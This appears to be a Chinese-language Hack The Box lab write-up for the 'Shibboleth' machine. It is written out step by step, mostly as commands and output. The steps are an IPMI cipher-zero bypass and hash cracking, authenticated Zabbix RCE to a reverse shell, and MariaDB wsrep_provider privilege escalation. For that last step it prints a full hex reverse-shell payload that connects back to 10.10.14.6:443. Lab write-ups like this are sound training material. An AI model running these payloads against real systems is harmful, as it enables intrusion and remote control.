    <content type="html"><![CDATA[<h1 id="Shibboleth"><a href="#Shibboleth" class="headerlink" title="Shibboleth"></a>Shibboleth</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PORT</span>   STATE SERVICE REASON         VERSION<br><span class="hljs-attribute">80</span>/tcp open  http    syn-ack ttl <span class="hljs-number">63</span> Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">41</span><br><span class="hljs-attribute">Service</span> Info: Host: shibboleth.htb<br></code></pre></td></tr></table></figure><h2 id="列舉"><a href="#列舉" class="headerlink" title="列舉"></a>列舉</h2><ul><li><p>subdomain</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wfuzz -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">110000</span>.txt -u Shibboleth.htb  -H <span class="hljs-string">&#x27;host:FUZZ.Shibboleth.htb&#x27;</span> --hw <span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/V9x98P5.png"></p></li><li><p>UDP</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -Pn -n -sU -<span class="hljs-selector-tag">p</span>- <span class="hljs-attr">--min-rate</span> <span class="hljs-number">2000</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.124</span> <span class="hljs-attr">--open</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/dw3CX6b.png"></p></li><li><p>IPMI</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfconsole<br><br>scanner<span class="hljs-regexp">/ipmi/i</span>pmi_version<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/3ZrThKw.png"></p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">在ipmi <span class="hljs-number">2.0</span> 有漏洞存在 密碼類行為<span class="hljs-number">0</span> 可在使用者名稱存在的情況下繞過密碼訪問<br><br>auxiliary<span class="hljs-regexp">/scanner/i</span>pmi/ipmi_cipher_zero<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/7pMfZqC.png"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ipmitool</span> -I lanplus -C <span class="hljs-number">0</span> -H <span class="hljs-number">10.10.11.124</span> -U <span class="hljs-string">&#x27;Administrator&#x27;</span> -P <span class="hljs-string">&#x27;123123&#x27;</span> user list<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/l3vM9I3.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">msf 的hashdump撈出hash<br><br>scanner<span class="hljs-regexp">/ipmi/i</span>pmi_dumphashes<br><br>Administrator:b16b065082040000da227631f53903b97f689ad6fc911214d483e5be6bec934d5e7b31dde781a5b4a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:<span class="hljs-number">065</span>dbfeb348ccce0b7ac7337e764c00c7e083192<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/mIYgLXR.png"></p><ul><li><p>hashcat crack IPMI2 RAKP HMAC-SHA1</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">hashcat -m <span class="hljs-number">7300</span> -a <span class="hljs-number">0</span> hash <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br><br>ilovepumkinpie1<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/DqcVoTv.png"></p></li><li><p>登入zabbix</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">利用剛剛獲得的憑證<span class="hljs-title class_">Administrator</span><span class="hljs-symbol">:ilovepumkinpie1</span><br>登入zabbix<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/SKSmhR7.png"></p></li></ul><h2 id="外殼"><a href="#外殼" class="headerlink" title="外殼"></a>外殼</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Zabbix</span> <span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">17</span> - Remote Code Execution (RCE) (Authenticated)<br><br><span class="hljs-attribute">python3</span> <span class="hljs-number">50816</span>.py http://zabbix.shibboleth.htb/ &#x27;Administrator&#x27; &#x27;ilovepumkinpie1&#x27; <span class="hljs-number">10.10.14.6</span> <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/9Snu5a5.png"></p><ul><li>reverse shell<br><img src="https://i.imgur.com/ozyEmgH.png"></li></ul><h2 id="提權"><a href="#提權" class="headerlink" title="提權"></a>提權</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">利用同一組密碼切換使用者到ipmi-svc<br><br><span class="hljs-regexp">/etc/</span>zabbix 為zabbix設定檔 找尋有無mysql帳密<br><br>grep <span class="hljs-string">&quot;db&quot;</span> -nir .<br><br><span class="hljs-comment"># zabbix:bloooarskybluh</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/EARanPO.png"></p><ul><li>漏洞利用<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看mariadb 版本<br>select @@version;<br><span class="hljs-number">10.3</span>.<span class="hljs-number">25</span>-MariaDB-<span class="hljs-number">0</span>ubuntu0.<span class="hljs-number">20.04</span>.<span class="hljs-number">1</span> <br><br>MariaDB <span class="hljs-number">10.2</span> /MySQL - <span class="hljs-string">&#x27;wsrep_provider&#x27;</span> OS Command Execution<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Al1ex/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">27928</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/shell_reverse_tcp <span class="hljs-attribute">lhost</span>=10.10.14.6 <span class="hljs-attribute">lport</span>=443 -f elf-so &gt; journalctl.so<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/YrpNY3i.png"></li></ul><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cos">python3 -c &#x27;<span class="hljs-keyword">print</span>(<span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;journalctl.so&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).<span class="hljs-keyword">read</span>().hex())&#x27;<br>&lt;-c &#x27;<span class="hljs-keyword">print</span>(<span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;journalctl.so&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).<span class="hljs-keyword">read</span>().hex())&#x27;<br><br><span class="hljs-number">7</span>f454c4602010100000000000000000003003e000100000092010000000000004000000000000000b000000000000000000000004000380002004000020001000100000007000000000000000000000000000000000000000000000000000000dc0100000000000026020000000000000010000000000000020000000700000030010000000000003001000000000000300100000000000060000000000000006000000000000000001000000000000001000000060000000000000000000000300100000000000030010000000000006000000000000000000000000000000008000000000000000700000000000000000000000300000000000000000000009001000000000000900100000000000002000000000000000000000000000000000000000000000000000000000000000c00000000000000920100000000000005000000000000009001000000000000060000000000000090010000000000000a0000000000000000000000000000000b0000000000000000000000000000000000000000000000000000000000000000006a2958996a025f6a015e0f05489748b9020001bb0a0a0e06514889e66a105a6a2a580f056a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/uCfXjo3.png"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">直接傳輸或是直接寫入<br><br>select unhex(&#x27;7f454c<span class="hljs-number">46020101000000</span><span class="hljs-number">00000000000003</span>003e<span class="hljs-number">00010000009201</span><span class="hljs-number">00000000000040</span><span class="hljs-number">00000000000000</span>b<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000040003</span><span class="hljs-number">80002004000020</span><span class="hljs-number">00100010000000</span><span class="hljs-number">70000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">000000000000</span>0dc<span class="hljs-number">01000000000000</span><span class="hljs-number">26020000000000</span><span class="hljs-number">00001000000000</span><span class="hljs-number">00000200000007</span><span class="hljs-number">00000030010000</span><span class="hljs-number">00000000300100</span><span class="hljs-number">00000000003001</span><span class="hljs-number">00000000000060</span><span class="hljs-number">00000000000000</span><span class="hljs-number">60000000000000</span><span class="hljs-number">00001000000000</span><span class="hljs-number">00000100000006</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000300100</span><span class="hljs-number">00000000003001</span><span class="hljs-number">00000000000060</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00080000000000</span><span class="hljs-number">00000700000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">03000000000000</span><span class="hljs-number">00000000009001</span><span class="hljs-number">00000000000090</span><span class="hljs-number">01000000000000</span><span class="hljs-number">02000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000</span>0c<span class="hljs-number">00000000000000</span><span class="hljs-number">92010000000000</span><span class="hljs-number">00050000000000</span><span class="hljs-number">00009001000000</span><span class="hljs-number">00000006000000</span><span class="hljs-number">00000000900100</span><span class="hljs-number">0000000000</span>0a<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span>000b<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">0000000000</span>6a<span class="hljs-number">295899</span>6a025f6a015e0f<span class="hljs-number">05489748</span>b<span class="hljs-number">902000</span>1bb0a0a0e<span class="hljs-number">06514889</span>e66a105a6a2a580f056a035e48ffce6a<span class="hljs-number">2158</span>0f<span class="hljs-number">0575</span>f66a3b<span class="hljs-number">589948</span>bb2f<span class="hljs-number">6269</span>6e2f<span class="hljs-number">736800534889</span>e<span class="hljs-number">75257488</span>9e60f05&#x27;) into dumpfile &#x27;/tmp/journalctl.so&#x27;;<br>&lt;<span class="hljs-number">34889</span>e752574889e60f05&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">wsrep_provider</span>=<span class="hljs-string">&quot;/tmp/journalctl.so&quot;</span>;<br>nc -lvnp 443<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/O2YQh6U.png"></p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
      <category>靶機</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IPMI</tag>
      
      <tag>Zabbix</tag>
      
      <tag>mariaDB</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
